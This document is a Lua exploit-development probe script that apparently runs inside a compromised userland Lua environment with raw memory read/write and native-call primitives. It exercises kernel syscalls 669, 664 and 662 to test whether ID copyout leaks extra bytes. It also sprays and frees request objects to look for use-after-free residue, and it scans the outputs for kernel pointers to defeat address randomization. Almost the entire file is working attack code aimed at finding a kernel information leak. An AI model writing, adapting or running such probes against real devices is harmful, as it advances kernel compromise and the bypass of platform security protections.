-- CRASH_CLASS: LOW
-- PROBE 74b: 669 IDs output overcopy test
--
-- Does 669's IDs copyout write more than 4 bytes per ID?
-- If it writes 8 bytes (qword), the extra 4 bytes could contain
-- kernel data from R+0x04 (part of curthread+0x390 pointer).
-- Also tests batch stride, alignment, class variants, and
-- post-free residual in newly allocated IDs.

print("=== PROBE 74b: 669 IDS OVERCOPY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wb(a, v) pcall(function() memory.write_byte(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do wb(N(p) + i - 1, string.byte(s, i)) end
    wb(N(p) + #s, 0)
    return p
end

local fd_zero = -1
pcall(function()
    fd_zero = N(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
end)
print("zero_fd=" .. fd_zero)
if fd_zero < 0 then print("FAILED open /dev/zero"); return end

local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)

local function fill_sentinel(buf, len, val)
    val = val or 0xDE
    for i = 0, len - 1 do wb(N(buf) + i, val) end
end

local function dump_bytes(buf, len, label)
    local line = ""
    local modified = 0
    local first_mod, last_mod = -1, -1
    for i = 0, len - 1 do
        local b = rb(N(buf) + i) or 0
        if b ~= 0xDE then
            modified = modified + 1
            if first_mod == -1 then first_mod = i end
            last_mod = i
        end
        line = line .. string.format("%02X ", b)
        if (i + 1) % 16 == 0 then
            print(string.format("  %s +0x%02X: %s", label, i - 15, line))
            line = ""
        end
    end
    if #line > 0 then
        print(string.format("  %s +0x%02X: %s", label, len - (len % 16), line))
    end
    print(string.format("  %s: %d/%d bytes modified (first=%d last=%d)",
        label, modified, len, first_mod, last_mod))
    return modified, first_mod, last_mod
end

local function kptr_check(buf, len)
    local count = 0
    for i = 0, len - 8, 4 do
        local lo = rd(N(buf) + i)
        local hi = rd(N(buf) + i + 4)
        if lo and hi then
            if lo < 0 then lo = lo + 0x100000000 end
            if hi < 0 then hi = hi + 0x100000000 end
            if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                print(string.format("  *** KERNEL PTR at +0x%02X: 0x%08X%08X ***", i, hi, lo))
                count = count + 1
            end
        end
    end
    return count
end

local function build_req(fd)
    local reqs = memory.alloc(0x30)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd); wd(N(reqs) + 0x24, 0)
    return reqs
end

local function poll_id(id)
    local one_id = memory.alloc(8); wd(N(one_id), id)
    local one_st = memory.alloc(8); wd(N(one_st), 0)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
end

local function delete_id(id)
    local one_id = memory.alloc(8); wd(N(one_id), id)
    local one_st = memory.alloc(8); wd(N(one_st), 0)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
end

local total_kptrs = 0

-- ============================================================
-- [A] Single submit — oversized IDs buffer (64 bytes)
-- ============================================================
print("[A] Single submit, 64-byte IDs buffer")
local ids_a = memory.alloc(64)
fill_sentinel(ids_a, 64)
local reqs_a = build_req(fd_zero)
pcall(function()
    mk(669)(uint64(1), uint64(N(reqs_a)), uint64(1), uint64(1), uint64(N(ids_a)))
end)
local mod_a = dump_bytes(ids_a, 64, "A")
local kp_a = kptr_check(ids_a, 64)
total_kptrs = total_kptrs + kp_a

local id_a = rd(N(ids_a)) or 0
if id_a < 0 then id_a = id_a + 0x100000000 end
print(string.format("  ID dword = 0x%08X", id_a))
local hi_a = rd(N(ids_a) + 4) or 0
if hi_a < 0 then hi_a = hi_a + 0x100000000 end
print(string.format("  +4 dword = 0x%08X (sentinel=0xDEDEDEDE)", hi_a))
if id_a ~= 0 then poll_id(id_a); delete_id(id_a) end

if not alive() then print("DEAD after A"); return end

-- ============================================================
-- [B] Batch submit (count=4), 256-byte buffer
-- ============================================================
print("")
print("[B] Batch submit count=4, 256-byte IDs buffer")
local ids_b = memory.alloc(256)
fill_sentinel(ids_b, 256)
local reqs_b = build_req(fd_zero)
pcall(function()
    mk(669)(uint64(1), uint64(N(reqs_b)), uint64(4), uint64(1), uint64(N(ids_b)))
end)

print("  First 64 bytes:")
dump_bytes(ids_b, 64, "B")
local kp_b = kptr_check(ids_b, 64)
total_kptrs = total_kptrs + kp_b

for i = 0, 3 do
    local d = rd(N(ids_b) + i * 4) or 0
    if d < 0 then d = d + 0x100000000 end
    local d8 = rd(N(ids_b) + i * 8) or 0
    if d8 < 0 then d8 = d8 + 0x100000000 end
    print(string.format("  stride4[%d]=0x%08X  stride8[%d]=0x%08X", i, d, i, d8))
end

-- Clean up batch IDs
for stride = 4, 8, 4 do
    for i = 0, 3 do
        local d = rd(N(ids_b) + i * stride) or 0
        if d < 0 then d = d + 0x100000000 end
        if d ~= 0 and d ~= 0xDEDEDEDE then
            poll_id(d); delete_id(d)
        end
    end
end

if not alive() then print("DEAD after B"); return end

-- ============================================================
-- [C] Individual submits at stride 8
-- ============================================================
print("")
print("[C] 8 individual submits at stride 8 into shared buffer")
local ids_c = memory.alloc(128)
fill_sentinel(ids_c, 128)
local c_ids = {}

for i = 0, 7 do
    local off = i * 8
    local reqs_c = build_req(fd_zero)
    local ptr = uint64(string.format("0x%X", N(ids_c) + off))
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs_c)), uint64(1), uint64(1), ptr)
    end)
    local d0 = rd(N(ids_c) + off) or 0
    if d0 < 0 then d0 = d0 + 0x100000000 end
    local d4 = rd(N(ids_c) + off + 4) or 0
    if d4 < 0 then d4 = d4 + 0x100000000 end
    local wrote_hi = (d4 ~= 0xDEDEDEDE)
    print(string.format("  [%d] +0x%02X: id=0x%08X  +4=0x%08X  wrote_hi=%s",
        i, off, d0, d4, tostring(wrote_hi)))
    if d0 ~= 0 and d0 ~= 0xDEDEDEDE then
        table.insert(c_ids, d0)
    end
end

print("  Full buffer hex:")
dump_bytes(ids_c, 128, "C")
local kp_c = kptr_check(ids_c, 128)
total_kptrs = total_kptrs + kp_c

for _, id in ipairs(c_ids) do poll_id(id); delete_id(id) end

if not alive() then print("DEAD after C"); return end

-- ============================================================
-- [D] Post-free residual: free 32 R objects, resubmit 32
-- ============================================================
print("")
print("[D] Post-free residual: free 32 R, resubmit 32 into 512B buffer")

local d_ids_first = {}
for i = 1, 32 do
    local one = memory.alloc(8); wd(N(one), 0)
    local r = build_req(fd_zero)
    pcall(function()
        mk(669)(uint64(1), uint64(N(r)), uint64(1), uint64(1), uint64(N(one)))
    end)
    local id = rd(N(one)) or 0
    if id < 0 then id = id + 0x100000000 end
    if id ~= 0 then table.insert(d_ids_first, id) end
end
print("  first batch: " .. #d_ids_first .. " submitted")

for _, id in ipairs(d_ids_first) do poll_id(id) end
for _, id in ipairs(d_ids_first) do delete_id(id) end
print("  first batch: all polled+deleted (R freed with kernel ptrs)")

local ids_d = memory.alloc(512)
fill_sentinel(ids_d, 512)
local d_ids_second = {}

for i = 0, 31 do
    local off = i * 8
    local r = build_req(fd_zero)
    local ptr = uint64(string.format("0x%X", N(ids_d) + off))
    pcall(function()
        mk(669)(uint64(1), uint64(N(r)), uint64(1), uint64(1), ptr)
    end)
    local d0 = rd(N(ids_d) + off) or 0
    if d0 < 0 then d0 = d0 + 0x100000000 end
    local d4 = rd(N(ids_d) + off + 4) or 0
    if d4 < 0 then d4 = d4 + 0x100000000 end
    if d0 ~= 0 and d0 ~= 0xDEDEDEDE then
        table.insert(d_ids_second, d0)
    end
    local h4 = d4
    if h4 >= 0xFFFF8000 and h4 < 0xFFFFFFFF then
        print(string.format("  *** KPTR at slot %d +4: 0x%08X%08X ***", i, d4, d0))
        total_kptrs = total_kptrs + 1
    end
end
print("  second batch: " .. #d_ids_second .. " submitted")

local d_kptrs = kptr_check(ids_d, 256)
total_kptrs = total_kptrs + d_kptrs

local non_sentinel_hi = 0
for i = 0, 31 do
    local d4 = rd(N(ids_d) + i * 8 + 4) or 0
    if d4 < 0 then d4 = d4 + 0x100000000 end
    if d4 ~= 0xDEDEDEDE and d4 ~= 0 then
        non_sentinel_hi = non_sentinel_hi + 1
    end
end
print("  non-sentinel +4 dwords: " .. non_sentinel_hi .. "/32")

-- Print first 8 entries for inspection
print("  First 8 entries:")
for i = 0, 7 do
    local d0 = rd(N(ids_d) + i * 8) or 0
    if d0 < 0 then d0 = d0 + 0x100000000 end
    local d4 = rd(N(ids_d) + i * 8 + 4) or 0
    if d4 < 0 then d4 = d4 + 0x100000000 end
    print(string.format("    [%d] lo=0x%08X hi=0x%08X", i, d0, d4))
end

for _, id in ipairs(d_ids_second) do poll_id(id); delete_id(id) end

if not alive() then print("DEAD after D"); return end

-- ============================================================
-- [E] Alignment test: misaligned ids buffer
-- ============================================================
print("")
print("[E] Alignment test: misaligned IDs buffer")
for align = 0, 3 do
    local buf = memory.alloc(32)
    fill_sentinel(buf, 32)
    local ptr = uint64(string.format("0x%X", N(buf) + align))
    local r = build_req(fd_zero)
    pcall(function()
        mk(669)(uint64(1), uint64(N(r)), uint64(1), uint64(1), ptr)
    end)
    local bytes_changed = 0
    for j = 0, 15 do
        local b = rb(N(buf) + j) or 0xDE
        if b ~= 0xDE then bytes_changed = bytes_changed + 1 end
    end
    local d0 = rd(N(buf) + align) or 0
    if d0 < 0 then d0 = d0 + 0x100000000 end
    print(string.format("  align=%d: bytes_changed=%d id_at_off=0x%08X", align, bytes_changed, d0))
    if d0 ~= 0 and d0 ~= 0xDEDEDEDE then
        poll_id(d0); delete_id(d0)
    end
end

if not alive() then print("DEAD after E"); return end

-- ============================================================
-- [F] Class 2 and 3 IDs output format
-- ============================================================
print("")
print("[F] Class 2 and 3 IDs output")
for cls = 1, 3 do
    local buf = memory.alloc(32)
    fill_sentinel(buf, 32)
    local r = build_req(fd_zero)
    pcall(function()
        mk(669)(uint64(1), uint64(N(r)), uint64(1), uint64(cls), uint64(N(buf)))
    end)
    local d0 = rd(N(buf)) or 0
    if d0 < 0 then d0 = d0 + 0x100000000 end
    local d4 = rd(N(buf) + 4) or 0
    if d4 < 0 then d4 = d4 + 0x100000000 end
    local d8 = rd(N(buf) + 8) or 0
    if d8 < 0 then d8 = d8 + 0x100000000 end
    print(string.format("  class=%d: +0=0x%08X +4=0x%08X +8=0x%08X", cls, d0, d4, d8))
    if d0 ~= 0 and d0 ~= 0xDEDEDEDE then
        poll_id(d0); delete_id(d0)
    end
end

-- ============================================================
-- [G] SUMMARY
-- ============================================================
print("")
print("[G] SUMMARY")
print("  total kernel pointers found: " .. total_kptrs)
print("  alive=" .. tostring(alive()))
print("")
print("=== PROBE 74b COMPLETE ===")
